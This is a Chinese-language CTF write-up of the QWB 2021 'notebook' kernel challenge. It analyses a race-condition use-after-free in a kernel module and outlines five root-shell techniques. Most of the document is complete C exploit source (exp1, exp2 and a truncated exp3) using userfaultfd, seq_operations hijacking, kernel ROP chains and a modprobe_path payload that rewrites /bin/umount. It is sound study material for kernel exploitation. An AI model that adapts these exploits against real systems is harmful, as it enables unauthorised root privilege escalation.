mynote_write：根据传入的idx，更新notebook[idx]->note的内容。也有`_check_object_size()`检查。\n\n然后看一下锁的情况，`noteadd()`和`noteedit()`中都有读锁，`notedel()`中有写锁，其他函数未使用锁。写锁设置后，读锁将被阻塞，所以`notedel()`无法条件竞争。而`noteadd()`和`noteedit()`设置了读锁，却都对notebook[idx].size有写的操作，因此条件竞争可以从它们当中构造。\n\n`noteedit()`函数漏洞的关键点如下：\n\n```c\n v5 = &notebook[idx];\n  raw_read_lock(&lock);\n  size = v5->size;\n  v5->size = newsize;                           // noteboot[idx].size可以被改大\n  if ( size == newsize )\n  {\n    v8 = 1LL;\n    goto editout;\n  }\n  v7 = (*(__int64 (__fastcall **)(void *, size_t, __int64))krealloc.gap0)(v5->note, newsize, 0x24000C0LL);\t\t\t\t// krealloc会释放v5->note，但v5->note值保持不变。在更新v5->note之前，其他线程仍可访问该释放的堆块，导致UAF。只不过这个条件竞争的时间窗口很小。\n  copy_from_user(name, v4, 0x100LL);            // 所以在这里使用userfaultfd让释放线程卡住，延长时间窗口，其他线程UAF\n  if ( !v5->size )\n  {\n    printk(\"free in fact\");\n    v5->note = 0LL;\n    v8 = 0LL;\n    goto editout;\n  }\n  if ( (unsigned __int8)_virt_addr_valid(v7) )\n  {\n    v5->note = (void *)v7;\t\t// 更新v5->note的值\n```\n\n`noteadd()`函数漏洞的关键点如下：\n\n```c\n    v4 = v3;\n    v5 = &notebook[idx];\n    raw_read_lock(&lock);\n    v6 = v5->size;\n    v5->size = size;\t\t\t\t\t\t// notebook[idx]->size被设置\n    if ( size > 0x60 )                          \n    {\n      v5->size = v6;\n      v7 = -2LL;\n      printk(\"[x] Add size out of range.\\n\");\n    }\n    else\n    {notebook[idx]->size小于0x60，进该分支\n      copy_from_user(name, v4, 0x100LL);\t\t// notebook[idx]->size小于0x60，进该分支。可利用userfaultfd阻塞，将size改成某个小于等于0x60大小的值\n      if ( v5->note )                           \n      {\n        v5->size = v6;\n```\n\n至此，分析的结果如下：\n\n1. noteadd一个内核堆块heap1\n2. 【新线程1】noteedit传入一个大size，使heap1被free，并通过userfaultfd使流程在copy_from_user()时停住。此时，heap1的地址还在notebook[index].note上，于是UAF就产生了。\n3. 【新线程2】noteadd将heap1对应的size重新改成原来的大小，并在copy_from_user()时停住。不然mynote_read和mynote_write无法正常执行。\n4. 在主线程中，就可以自由地对已经free掉的heap1进行自由读写操作了！\n\n如下图所示：\n\n![image-20230225213203420](image-20230225213203420.png?size=600)\n\n接下来就看怎么利用这个UAF读写。\n\n## 利用\n\n利用思路：\n\n1. 最早noteadd时指定0x20大小\n2. 当UAF产生并能自由读写后，使用seq_operations结构体占用heap1。个人认为这个结构体比较好用，无需另外构造函数指针列表\n3. 先通过mynote_read泄露`seq_operations->start`函数指针\n4. 再通过mynote_write改写`seq_operations->start`函数指针，实现控制流劫持\n5. 控制流劫持后，利用内核ROP（notegift泄露堆地址）栈迁移到堆，继续ROP利用\n\n这里列出四种get root shell的方式\n\n- modprobe_path - **exp1**\n\n  1）使用prepare()模板，做好准备工作（`/tmp/x`, `/tmp/dummy`, `/bin/umount`），fork()子进程\n\n  2）子进程将modprobe_path改成`/tmp/x`\n\n  3）父进程等待一段时间后，执行`/tmp/dummy`，回shell。\n\n  4）再exit即可获得root shell\n\n- KPTI trampoline - **exp2**\n\n  1）执行commit_creds(prepare_cred(0))\n\n  2）利用swapgs_restore_regs_and_return_to_usermode()设置CR3，安全返回用户态（劫持到一系列pop后的第一个mov指令开始即可）\n\n  3）getshell被执行\n\n- signal handler - **exp3**\n\n  1）用户态注册signal(SIGSEGV,getshell)\n\n  2）执行commit_creds(prepare_cred(0))\n\n  3）swapgs和iretq返回用户态时触发SIGSEGV\n\n  4）getshell被执行\n\n- tty_struct + work_for_cpu_fn() - **exp4**\n\n  1）先构造一个0x3a8（kmalloc-1024）大小的UAF堆块heap1\n\n  2）通过`open(\"dev/ptmx\",2); `取回heap1，于是我们就可以控制tty_struct的内容\n\n  2）再构造一个任意大小（0x100）的堆块heap2，用来存放构造的tty_operations，更改ioctl函数指针\n\n  3）读取heap1的内容，更改0x18偏移处指向heap2。更改0x20（prepare_kernel_creds）和0x28（参数0）处的值，并保存0x30（ldisc_sem）处的值为old_value。最后将以上内容写回heap1。\n\n  4）调用ioctl，内核将执行prepare_kernel_creds(0) \n\n  5）读取heap1的内容，返回值pkc_ret在0x30处，更改0x20（commit_creds）和0x28（pkc_value）处的值，并更改0x30（ldisc_sem）处的值为old_value。最后将以上内容写回heap1。\n\n  6）调用ioctl，内核将执行commit_creds(pkc_ret)\n\n  7）用户态执行system(\"/bin/sh\")，即可获得root shell\n\n- leak heap cookie + modprobe_path - **exp5**\n\n  这个巧妙的利用方法来源：[强网杯2021 Writeup by X1cT34m](https://ctf.njupt.edu.cn/archives/627#notebook)\n\n  利用方法的描述参考：[从强网杯 Notebook 看内核条件竞争](https://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/)\n\n  ```\n  该方法不需要内核ROP，巧妙利用了slub的控制字节（freelist 单向链表，类似 fastbin）。\n  \t1. 分配两个 0x60 的块，分别为 chunk1, chunk2。\n  \t2. 通过 gift 读出 chunk1 和 chunk2 的地址。\n  \t3. free (chunk2) , free (chunk1)，此时 freelist -> chunk1 -> chunk2\n  \t4. 再次分配 chunk1 和 chunk2，通过 gift 确保和上次分配的是同两个块。\t\n  \t5. 此时读出 chunk1 的前 8 字节，这 8 字节应为 cookie ^ chunk1_addr ^ chunk2_addr（详见 Kirin）。这样就能泄露出 cookie。\n  \t6. 重新开始，构造UAF，使chunk1被free，但堆地址还在notebook[0]上。\n  \t7. 向被 free 掉的 chunk1 中写入构造好的内容。此时我们写入 8 字节 cookie ^ chunk1_addr ^ notebook_addr-0x10 即可将 freelist 链改为 freelist -> chunk1 -> notebook_addr - 0x10。（但此时 freelist 链并不合法）\n  \t8. 由于 name 在 bss 上的位置正好在 notebook 的前面，所以可以将 note_addr - 0x10 的地方写为 cookie ^ notebook_addr - 0x10 ^ 0，这样 freelist 链就合法了。\n  \t9. 现在 notebook 可控，就能拿到任意地址读写的权力了。通过 notebook.ko 调用内核函数的地方泄露内核基地址，然后改写 modprobe_path 来提权。\n  ```\n\n  \n\n\n\n### exp1\n\n> 利用modprobe_path改umount，exit退出系统时获得root shell\n\n```c\n#define _GNU_SOURCE\n#include <inttypes.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <poll.h>\n\nint g_fd = 0;\nchar* addr;\nuint64_t temp_buf[0x20];\nint temp_fd;\nuint64_t heap_addr;\n\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n\nuint64_t single_start_func = 0xFFFFFFFF8128C230;\nuint64_t bzImage_base = 0xFFFFFFFF81000000;\nuint64_t kernel_base;\nuint64_t ret_188 = 0xffffffff811a71c6;\nuint64_t pop_rax_ret = 0xffffffff81540d04;\nuint64_t pop_rdi_ret = 0xffffffff81007115;\nuint64_t mov_ptr_rdi_rax = 0xffffffff814157e9;\nuint64_t modprobe_path_addr = 0xFFFFFFFF8225D2E1;\nuint64_t add_rsp_1a8 = 0xffffffff816473a4;\nuint64_t do_task_dead_func = 0xFFFFFFFF810B3FA0;\nuint64_t pop_rsp_ret = 0xffffffff810bc110;\n\nstruct note{\n\tuint64_t note;\n\tuint64_t size;\n};\n\nstruct userarg{\n    uint64_t idx;\n    uint64_t size;\n    char* buf;\n};\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid* userfaultfd_leak_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(30);\n    // pause();\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\n\n\n\n/*  cmd\n    0x100 - noteadd : 为notebook[idx]->note申请一篇size大小的空间\n    0x64 - notegift : 将notebook处的256个字节全部拷贝给用户态（信息泄露） - 泄露堆地址\n    0x200 - notedel : free掉notebook[idx]->note对应的空间，在size不为0的情况下，清空bss段上的内容\n    0x300 - noteedit : 修改notebook[idx]的大小，note和size，逻辑有问题导致size变任意大小\n*/\n\nvoid noteadd(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x100, &arg);\n}\n\nvoid notedel(uint64_t idx){\n    struct userarg arg = {\n        .idx = idx,\n        .size = 0,\n        .buf = 0,\n    };\n    \n    ioctl(g_fd, 0x200, &arg);\n}\n\nvoid noteedit(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x300, &arg);    \n}\n\nvoid notegift(char* buf){\n    struct userarg arg = {\n        .idx = 0,\n        .size = 0,\n        .buf = buf,\n    };   \n\n    ioctl(g_fd, 0x64, &arg);\n}\n\nvoid write_note(char* con_buf, uint64_t idx){\n    write(g_fd,con_buf,idx);\n}\n\nvoid read_note(char* con_buf, uint64_t idx){\n    read(g_fd,con_buf,idx);\n}\n\nvoid* edit_thread(){\n    noteedit(0, 0x100, addr);\n    return NULL;\n}\n\nvoid* add_thread(){\n    noteadd(0,0x20,addr);\n    return NULL;\n}\n\n\nvoid prepare(){ \n    system(\"echo '#!/bin/sh\\nrm /bin/umount\\necho -e \\\"#!/bin/sh\\\\nexec 0</dev/console\\\\nexec 1>/dev/console\\\\nexec 2>/dev/console\\\\n/bin/sh\\\\n\\\" > /bin/umount\\nchmod 777 /bin/umount' > /tmp/x\");\n    system(\"echo 'chmod 777 /flag' >> /tmp/x\");\n    system(\"chmod +x /tmp/x\");\n    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\");\n    system(\"chmod +x /tmp/dummy\");\n\n    if(fork()) {\n        sleep(20);                          \n        system(\"/tmp/dummy 2>/dev/null\");\n        system(\"ls -l /flag\");\n        system(\"cat /flag\");\n        exit(1);\n    }\n}\n\nint main(){\n    prepare();\n\n    char *ret_buf = malloc(0x60);\n    int i;\n    int fd[0x100];\n    uint64_t leak_addr;\n    int index;\n    g_fd = open(\"/dev/notebook\",2);\n\n// 1. notebook[0].note = heap1 / notebook[0].size = 0x20\n    char* name = malloc(0x100);\n    memset(name, 'a', 18);\n    noteadd(0,0x20,name);\n\n// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100\n    addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(addr, userfaultfd_leak_handler);\n    pthread_t thr_edit,thr_add;\n    pthread_create(&thr_edit, NULL, edit_thread, 0);\n\n// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20\n    pthread_create(&thr_add, NULL, add_thread, 0);\n    // sleep(1);   //给1s缓冲时间，让size值写上\n    \n// 4. get heap1 back, then we can use the UAF\n    for(i =0 ;i<100; i++){\n        fd[i] = open(\"/proc/self/stat\",0);              // in kernel it will kmalloc(0x20)\n        read_note(ret_buf, 0);                          // check whether we hit heap1 or not\n        leak_addr = *(int64_t *)ret_buf;\n        if(((leak_addr&0xffffffff00000000) >> 32) == 0xFFFFFFFF){\n            index = i;\n            printf(\"found it! the index is %d\\n\",index);\n            break;\n        }\n    }\n\n    if(i == 100){\n        printf(\"failed to get heap1 back, let's try again!\\n\");\n        exit(0);\n    }  \n\n// 5. leak kernel base: read heap1\n    kernel_base = leak_addr - (single_start_func - bzImage_base);\n    printf(\"kernel_base : 0x%lx\\n\",kernel_base);\n\n// 6. hijack control flow: write heap1, then trigger 'seq_operations->start'\n    uint64_t control_rip = add_rsp_1a8 - bzImage_base + kernel_base;\n    write_note((char*)&control_rip,0);\n\n// 7. stack pivoting: use the gift func ^_^\n    noteadd(1,0x60,name);\n    notegift(ret_buf);\n    heap_addr = *(int64_t *)(ret_buf+0x10);                 // heap addr\n    uint64_t gadget_buf[0x60] = {0};\n    gadget_buf[0] = pop_rax_ret - bzImage_base + kernel_base;\n    gadget_buf[1] = 0x782f706d742f;                                     // /tmp/x\n    gadget_buf[2] = pop_rdi_ret - bzImage_base + kernel_base;\n    gadget_buf[3] = modprobe_path_addr - bzImage_base + kernel_base;\n    gadget_buf[4] = mov_ptr_rdi_rax - bzImage_base + kernel_base;           // write modprobe_path\n    gadget_buf[5] = do_task_dead_func - bzImage_base + kernel_base;\n    write_note(gadget_buf,1);\n\n    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;\n\n// 8. trigger\n    temp_fd = fd[index];\n    __asm__(\n        \"mov r15, 0x15151515;\"     // r15\n        \"mov r14, 0x14141414;\"      // r14 /tmp/x\n        \"mov r13, 0x13131313;\"      // r13\n        \"mov r12, 0x12121212;\"      // r12\n        \"mov r11, 0x11111111;\"\n        \"mov r10, 0x10101010;\"      // r10\n        \"mov rbp, pop_rsp_ret;\"      // bbbbbbbb\n        \"mov rbx, heap_addr;\"      // aaaaaaaa\n        \"mov r9, 0x99999999;\"       // r9\n        \"mov r8, 0x88888888;\"       //r8\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x22222222;\"\n        \"mov rsi, 0x33333333;\"\n        \"mov rdi, temp_fd;\"\n        \"syscall\"\n    );\n\n    pthread_exit(NULL);\n    return 0;\n}\n```\n\n\n\n### exp2\n\n> commit_creds(prepare_cred(0))执行完成后，ROP链执行swapgs_restore_regs_and_return_to_usermode(), 提前设置好返回用户态的rip，获得root shell\n\n```c\n#define _GNU_SOURCE\n#include <inttypes.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <poll.h>\n\nint g_fd = 0;\nchar* addr;\nuint64_t temp_buf[0x20];\nint temp_fd;\nuint64_t heap_addr;\n\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n\nuint64_t single_start_func = 0xFFFFFFFF8128C230;\nuint64_t bzImage_base = 0xFFFFFFFF81000000;\nuint64_t kernel_base;\nuint64_t pop_rdi_ret = 0xffffffff81007115;\nuint64_t add_rsp_1a8 = 0xffffffff816473a4;\nuint64_t pop_rsp_ret = 0xffffffff810bc110;\nuint64_t kpti_trampoline_addr = 0xFFFFFFFF81A0093F;\nuint64_t pop_rsi_pop_rdx_pop_ret = 0xffffffff810d7324;\nuint64_t pop_rbp_ret = 0xffffffff81478d44;\nuint64_t mov_rdi_rax_pop_ret = 0xffffffff8110d81a;\n\nuint64_t cc_addr = 0xFFFFFFFF810A9B40;\nuint64_t pkc_addr = 0xFFFFFFFF810A9EF0;\n\nstruct note{\n\tuint64_t note;\n\tuint64_t size;\n};\n\nstruct userarg{\n    uint64_t idx;\n    uint64_t size;\n    char* buf;\n};\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid* userfaultfd_leak_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(30);\n    // pause();\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\nvoid noteadd(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x100, &arg);\n}\n\nvoid notedel(uint64_t idx){\n    struct userarg arg = {\n        .idx = idx,\n        .size = 0,\n        .buf = 0,\n    };\n    \n    ioctl(g_fd, 0x200, &arg);\n}\n\nvoid noteedit(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x300, &arg);    \n}\n\nvoid notegift(char* buf){\n    struct userarg arg = {\n        .idx = 0,\n        .size = 0,\n        .buf = buf,\n    };   \n\n    ioctl(g_fd, 0x64, &arg);\n}\n\nvoid write_note(char* con_buf, uint64_t idx){\n    write(g_fd,con_buf,idx);\n}\n\nvoid read_note(char* con_buf, uint64_t idx){\n    read(g_fd,con_buf,idx);\n}\n\nvoid* edit_thread(){\n    noteedit(0, 0x100, addr);\n    return NULL;\n}\n\nvoid* add_thread(){\n    noteadd(0,0x20,addr);\n    return NULL;\n}\n\nvoid getshell(){\n    system(\"/bin/sh\");\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    char *ret_buf = malloc(0x60);\n    int i;\n    int fd[0x100];\n    uint64_t leak_addr;\n    int index;\n    g_fd = open(\"/dev/notebook\",2);\n\n// 1. notebook[0].note = heap1 / notebook[0].size = 0x20\n    char* name = malloc(0x100);\n    memset(name, 'a', 18);\n    noteadd(0,0x20,name);\n\n// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100\n    addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    RegisterUserfault(addr, userfaultfd_leak_handler);\n    pthread_t thr_edit,thr_add;\n    pthread_create(&thr_edit, NULL, edit_thread, 0);\n\n// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20\n    pthread_create(&thr_add, NULL, add_thread, 0);\n    // sleep(1);   //给1s缓冲时间，让size值写上\n    \n// 4. get heap1 back, then we can use the UAF\n    for(i =0 ;i<100; i++){\n        fd[i] = open(\"/proc/self/stat\",0);              // in kernel it will kmalloc(0x20)\n        read_note(ret_buf, 0);                          // check whether we hit heap1 or not\n        leak_addr = *(int64_t *)ret_buf;\n        if(((leak_addr&0xffffffff00000000) >> 32) == 0xFFFFFFFF){\n            index = i;\n            printf(\"found it! the index is %d\\n\",index);\n            break;\n        }\n    }\n\n    if(i == 100){\n        printf(\"failed to get heap1 back, let's try again!\\n\");\n        exit(0);\n    }  \n\n// 5. leak kernel base: read heap1\n    kernel_base = leak_addr - (single_start_func - bzImage_base);\n    printf(\"kernel_base : 0x%lx\\n\",kernel_base);\n\n// 6. hijack control flow: write heap1, then trigger 'seq_operations->start'\n    uint64_t control_rip = add_rsp_1a8 - bzImage_base + kernel_base;\n    write_note((char*)&control_rip,0);\n \n// 7. stack pivot: use the gift func ^_^\n    save_status();\n    noteadd(1,0x60,name);\n    noteedit(1,0x200,name);\n    notegift(ret_buf);\n    heap_addr = *(int64_t *)(ret_buf+0x10);                 // heap addr\n    int a = 0;\n    uint64_t gadget_buf[0x200] = {0};\n    gadget_buf[a++] = pop_rdi_ret - bzImage_base + kernel_base;\n    gadget_buf[a++] = 0x0;                                     \n    gadget_buf[a++] = pkc_addr - bzImage_base + kernel_base;\n    gadget_buf[a++] = pop_rsi_pop_rdx_pop_ret - bzImage_base + kernel_base;     // mov rdi, rax\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = pop_rbp_ret - bzImage_base + kernel_base;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = mov_rdi_rax_pop_ret - bzImage_base + kernel_base;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = cc_addr - bzImage_base + kernel_base;;\n    gadget_buf[a++] = kpti_trampoline_addr - bzImage_base + kernel_base;\n    gadget_buf[a++] = 0x0;           \n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = (uint64_t)getshell;\n    gadget_buf[a++] = user_cs;\n    gadget_buf[a++] = user_rflags;\n    gadget_buf[a++] = user_sp;\n    gadget_buf[a++] = user_ss;\n\n    write_note(gadget_buf,1);\n\n// 8. trigger\n    temp_fd = fd[index];\n    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;\n    __asm__(\n        \"mov r15, 0x15151515;\"     // r15\n        \"mov r14, 0x14141414;\"      // r14 /tmp/x\n        \"mov r13, 0x13131313;\"      // r13\n        \"mov r12, 0x12121212;\"      // r12\n        \"mov r11, 0x11111111;\"\n        \"mov r10, 0x10101010;\"      // r10\n        \"mov rbp, pop_rsp_ret;\"      // bbbbbbbb\n        \"mov rbx, heap_addr;\"      // aaaaaaaa\n        \"mov r9, 0x99999999;\"       // r9\n        \"mov r8, 0x88888888;\"       //r8\n        \"mov rcx, 0xcccccccc;\"\n        \"xor rax, rax;\"\n        \"mov rdx, 0x22222222;\"\n        \"mov rsi, 0x33333333;\"\n        \"mov rdi, temp_fd;\"\n        \"syscall\"\n    );\n\n    pthread_exit(NULL);\n    return 0;\n}\n```\n\n\n\n### exp3\n\n> 用户态注册signal handler， 获得root shell\n\n```c\n#define _GNU_SOURCE\n#include <inttypes.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <poll.h>\n\nint g_fd = 0;\nchar* addr;\nuint64_t temp_buf[0x20];\nint temp_fd;\nuint64_t heap_addr;\n\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n\nuint64_t single_start_func = 0xFFFFFFFF8128C230;\nuint64_t bzImage_base = 0xFFFFFFFF81000000;\nuint64_t kernel_base;\nuint64_t pop_rdi_ret = 0xffffffff81007115;\nuint64_t add_rsp_1a8 = 0xffffffff816473a4;\nuint64_t pop_rsp_ret = 0xffffffff810bc110;\nuint64_t kpti_trampoline_addr = 0xFFFFFFFF81A0093F;\nuint64_t pop_rsi_pop_rdx_pop_ret = 0xffffffff810d7324;\nuint64_t pop_rbp_ret = 0xffffffff81478d44;\nuint64_t mov_rdi_rax_pop_ret = 0xffffffff8110d81a;\nuint64_t swapgs_pop_ret = 0xffffffff810637d4;\nuint64_t iretq = 0xFFFFFFFF81A009E7;\n\nuint64_t cc_addr = 0xFFFFFFFF810A9B40;\nuint64_t pkc_addr = 0xFFFFFFFF810A9EF0;\n\nstruct note{\n\tuint64_t note;\n\tuint64_t size;\n};\n\nstruct userarg{\n    uint64_t idx;\n    uint64_t size;\n    char* buf;\n};\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid* userfaultfd_leak_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(30);\n    // pause();\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\nvoid noteadd(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x100, &arg);\n}\n\nvoid notedel(uint64_t idx){\n    struct userarg arg = {\n        .idx = idx,\n        .size = 0,\n        .buf = 0,\n    };\n    \n    ioctl(g_fd, 0x200, &arg);\n}\n\nvoid noteedit(uint64_t idx, uint64_t size, char* buf){\n    struct userarg arg = {\n        .idx = idx,\n        .size = size,\n        .buf = buf,\n    };\n\n    ioctl(g_fd, 0x300, &arg);    \n}\n\nvoid notegift(char* buf){\n    struct userarg arg = {\n        .idx = 0,\n        .size = 0,\n        .buf = buf,\n    };   \n\n    ioctl(g_fd, 0x64, &arg);\n}\n\nvoid write_note(char* con_buf, uint64_t idx){\n    write(g_fd,con_buf,idx);\n}\n\nvoid read_note(char* con_buf, uint64_t idx){\n    read(g_fd,con_buf,idx);\n}\n\nvoid* edit_thread(){\n    noteedit(0, 0x100, addr);\n    return NULL;\n}\n\nvoid* add_thread(){\n    noteadd(0,0x20,addr);\n    return NULL;\n}\n\nvoid getshell(){\n    system(\"/bin/sh\");\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov 